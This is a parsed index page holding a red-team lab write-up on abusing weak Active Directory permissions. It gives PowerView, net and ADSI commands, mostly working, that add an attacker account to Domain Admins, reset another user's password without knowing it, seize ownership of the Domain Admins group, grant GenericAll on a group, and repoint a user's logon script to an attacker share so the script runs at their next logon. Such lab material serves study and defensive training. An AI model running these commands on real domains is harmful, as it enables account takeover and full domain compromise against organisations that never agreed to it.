---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Abusing Active Directory ACLs/ACEs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-abusing-active-directory-acls-aces` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Abusing Active Directory ACLs/ACEs](../../topics/offensive-security-experiments/abusing-active-directory-acls-aces.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-active-directory-kerberos-abuse-abusing-active-directory-acls-aces |
| name | Abusing Active Directory ACLs/ACEs |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2018-11-08 10-07.gif
- Screenshot from 2018-11-07 20-19-43.png
- Screenshot from 2018-11-07 20-21-30 (1).png
- Screenshot from 2018-11-08 09-50-20.png
- Screenshot from 2018-11-08 09-52-10.png
- Screenshot from 2018-11-08 11-06-32.png
- Screenshot from 2018-11-08 11-11-11.png
- Screenshot from 2018-11-08 11-23-52.png
- Screenshot from 2018-11-08 11-25-23.png
- Screenshot from 2018-11-08 12-30-11.png
- Screenshot from 2018-11-08 12-31-52.png
- Screenshot from 2018-11-08 12-58-25.png
- Screenshot from 2018-11-08 14-11-25.png
- Screenshot from 2018-11-08 15-21-35.png
- Screenshot from 2018-11-08 15-22-50.png
- Screenshot from 2018-11-08 16-45-36.png
- Screenshot from 2018-11-08 16-45-42.png
- Screenshot from 2018-11-08 16-54-59.png
- Screenshot from 2018-11-08 19-12-04.png
- Screenshot from 2018-11-08 19-13-45.png
- Screenshot from 2018-11-08 20-21-25.png
- Screenshot from 2018-11-10 19-02-49.png
- Screenshot from 2018-11-10 19-02-57.png
- Screenshot from 2018-11-10 19-07-16.png
- Screenshot from 2018-11-10 19-09-08.png
- Screenshot from 2018-11-10 19-29-27.png
_body: "# Abusing Active Directory ACLs/ACEs\n\n## Context\n\nThis lab is to abuse weak permissions of Active Directory Discretionary\
  \ Access Control Lists (DACLs) and Acccess Control Entries (ACEs) that make up DACLs.\n\nActive Directory objects such as\
  \ users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e change account name,\
  \ reset password, etc).&#x20;\n\nAn example of ACEs for the \"Domain Admins\" securable object can be seen here:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-08 20-21-25.png>)\n\nSome of the Active Directory object permissions and types that we as attackers are interested\
  \ in:\n\n* **GenericAll** - full rights to the object (add users to a group or reset user's password)\n* **GenericWrite**\
  \ - update object's attributes (i.e logon script)\n* **WriteOwner** - change object owner to attacker controlled user take\
  \ over the object\n* **WriteDACL** - modify object's ACEs and give attacker full control right over the object\n* **AllExtendedRights**\
  \ - ability to add user to a group or reset password\n* **ForceChangePassword** - ability to change user's password\n* **Self\
  \ (Self-Membership)** - ability to add yourself to a group\n\nIn this lab, we are going to explore and try to exploit most\
  \ of the above ACEs.\n\n## Execution\n\n### GenericAll on User\n\nUsing powerview, let's check if our attacking user `spotless`\
  \ has `GenericAll rights` on the AD object for the user `delegate`:\n\n```csharp\nGet-ObjectAcl -SamAccountName delegate\
  \ -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"}  \n```\n\nWe can see that indeed our user `spotless` has\
  \ the `GenericAll` rights, effectively enabling the attacker to take over the account:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-07 20-19-43.png>)\n\nWe can reset user's `delegate` password without knowing the current password:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-07 20-21-30 (1).png>)\n\n### GenericAll on Group\n\nLet's see if `Domain admins` group has any weak permissions.\
  \ First of, let's get its `distinguishedName`:\n\n```csharp\nGet-NetGroup \"domain admins\" -FullData\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-08 09-50-20.png>)\n\n```csharp\n Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"\
  }\n```\n\nWe can see that our attacking user `spotless` has `GenericAll` rights once again:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-08 09-52-10.png>)\n\nEffectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin`\
  \ group:\n\n```csharp\nnet group \"domain admins\" spotless /add /domain\n```\n\n![](<../../.gitbook/assets/Peek 2018-11-08\
  \ 10-07.gif>)\n\nSame could be achieved with Active Directory or PowerSploit module:\n\n```csharp\n# with active directory\
  \ module\nAdd-ADGroupMember -Identity \"domain admins\" -Members spotless\n\n# with Powersploit\nAdd-NetGroupUser -UserName\
  \ spotless -GroupName \"domain admins\" -Domain \"offense.local\"\n```\n\n### GenericAll / GenericWrite / Write on Computer\n\
  \nIf you have these privileges on a Computer object, you can pull [Kerberos Resource-based Constrained Delegation: Computer\
  \ Object Take Over](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md)\
  \ off.\n\n### WriteProperty on Group\n\nIf our controlled user has `WriteProperty` right on `All` objects for `Domain Admin`\
  \ group:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-11-11.png>)\n\nWe can again add ourselves to the `Domain\
  \ Admins` group and escalate privileges:\n\n```csharp\nnet user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName\
  \ \"domain admins\" -Domain \"offense.local\"; net user spotless /domain\n```\n\n![](<../../.gitbook/assets/Screenshot from\
  \ 2018-11-08 11-06-32.png>)\n\n### Self (Self-Membership) on Group\n\nAnother privilege that enables the attacker adding\
  \ themselves to a group:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-23-52.png>)\n\n```csharp\nnet user\
  \ spotless /domain; Add-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain \"offense.local\"; net user\
  \ spotless /domain\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 11-25-23.png>)\n\n### WriteProperty (Self-Membership)\n\
  \nOne more privilege that enables the attacker adding themselves to a group:\n\n```csharp\nGet-ObjectAcl -ResolveGUIDs |\
  \ ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\" -and $_.IdentityReference -eq \"OFFENSE\\spotless\"\
  }\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 15-21-35.png>)\n\n```csharp\nnet group \"domain admins\"\
  \ spotless /add /domain\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 15-22-50.png>)\n\n### **ForceChangePassword**\n\
  \nIf we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing\
  \ their current password:\n\n```csharp\nGet-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq\
  \ \"OFFENSE\\spotless\"}\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 12-30-11.png>)\n\nDoing the same\
  \ with powerview:\n\n```csharp\nSet-DomainUserPassword -Identity delegate -Verbose\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-08 12-31-52.png>)\n\nAnother method that does not require fiddling with password-secure-string conversion:\n\
  \n```csharp\n$c = Get-Credential\nSet-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose\n```\n\
  \n![](<../../.gitbook/assets/Screenshot from 2018-11-08 14-11-25.png>)\n\n...or a one liner if no interactive session is\
  \ not available:\n\n```csharp\nSet-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456'\
  \ -AsPlainText -Force) -Verbose\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 12-58-25.png>)\n\n### WriteOwner\
  \ on Group\n\nNote how before the attack the owner of `Domain Admins` is `Domain Admins`:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-08 16-45-36.png>)\n\nAfter the ACE enumeration, if we find that a user in our control has `WriteOwner` rights\
  \ on `ObjectType:All`\n\n```csharp\nGet-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"\
  \ -and $_.IdentityReference -eq \"OFFENSE\\spotless\"}\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 16-45-42.png>)\n\
  \n...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified\
  \ with `-Identity` is the SID of the `Domain Admins` group:\n\n```csharp\nSet-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512\
  \ -OwnerIdentity \"spotless\" -Verbose\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 16-54-59.png>)\n\n\
  ### GenericWrite on User\n\n```csharp\nGet-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq\
  \ \"OFFENSE\\spotless\"}\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 19-12-04.png>)\n\n`WriteProperty`\
  \ on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script\
  \ path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute\
  \ our malicious script:\n\n```csharp\nSet-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\
  \\10.0.0.5\\totallyLegitScript.ps1\"\n```\n\nBelow shows the user's ~~`delegate`~~ logon script field got updated in the\
  \ AD:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-08 19-13-45.png>)\n\n### WriteDACL + WriteOwner\n\nIf you are\
  \ the owner of a group, like I'm the owner of a `Test` AD group:\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-10\
  \ 19-02-57.png>)\n\nWhich you can of course do through powershell:\n\n```csharp\n([ADSI]\"LDAP://CN=test,CN=Users,DC=offense,DC=local\"\
  ).PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-10 19-29-27.png>)\n\nAnd you have a `WriteDACL` on that AD object:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-10 19-07-16.png>)\n\n...you can give yourself [`GenericAll`](abusing-active-directory-acls-aces.md#genericall-on-group)\
  \ privileges with a sprinkle of ADSI sorcery:\n\n```csharp\n$ADSI = [ADSI]\"LDAP://CN=test,CN=Users,DC=offense,DC=local\"\
  \n$IdentityReference = (New-Object System.Security.Principal.NTAccount(\"spotless\")).Translate([System.Security.Principal.SecurityIdentifier])\n\
  $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericAll\",\"Allow\"\n$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)\n\
  $ADSI.psbase.commitchanges()\n```\n\nWhich means you now fully control the AD object:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-11-10 19-02-49.png>)\n\nThis effectively means that you can now add new users to the group.\n\nInteresting to\
  \ note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:\n\n```csharp\n\
  $path = \"AD:\\CN=test,CN=Users,DC=offense,DC=local\"\n$acl = Get-Acl -Path $path\n$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule\
  \ (New-Object System.Security.Principal.NTAccount \"spotless\"),\"GenericAll\",\"Allow\"\n$acl.AddAccessRule($ace)\nSet-Acl\
  \ -Path $path -AclObject $acl\n```\n\n![](<../../.gitbook/assets/Screenshot from 2018-11-10 19-09-08.png>)\n\n## References\n\
  \n{% embed url=\"https://wald0.com/?p=112\" %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2\"\
  \ %}\n\n{% embed url=\"https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/\" %}\n\n\
  {% embed url=\"https://adsecurity.org/?p=3658\" %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_\"\
  \ %}\n\n[PowerView Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)"
_relative_path: offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces.md
````
